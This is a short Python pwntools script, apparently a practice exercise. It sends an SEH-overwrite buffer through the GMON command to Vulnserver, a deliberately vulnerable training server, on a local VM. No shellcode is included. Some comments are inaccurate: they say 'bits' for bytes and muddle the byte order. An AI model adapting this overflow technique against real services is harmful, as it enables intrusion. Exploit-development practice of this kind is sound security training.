#!/usr/bin/python
from pwn import *


host = "192.168.130.156"     # Windows VM
port = 9999                 # Vulnserver port

#badchars = "0x00"


#PPR address => 625010B4

#replace nextSEH address by code saying jump to next DDDD. Since there's jump code is 2 bits and
#there is 4 bits of code before reaching the DDDD, we gonna jump 6 bits 
#then code is eb 0x6 => \0xeb\0x06, we need to add 2 nop code to make it 4 bits then it becomes \xeb\x06
#And it becomes p32(0x909006eb)
#Doesn't need to be in reverse order so it can be directly "\xeb\x06\x90\x90"

#nextSEH = p32(0x06eb9090)
nextSEH = p32(0x909006eb)

#find "pop pop ret" address in mona with "!mona seh" and enter that value in SEH
SEH = p32(0x6250172B)

buffer = 'A' * (3546)
buffer += nextSEH
buffer += SEH

buffer += "DDDD"
buffer += 'E' * (5012 - len(buffer))

conn = remote(host, port)   # pwntools way to connect to host
conn.recvline()             # receive connection to host

conn.send("GMON /.../" + buffer)     # send evil buffer

conn.close()                        # Close connection if not hung
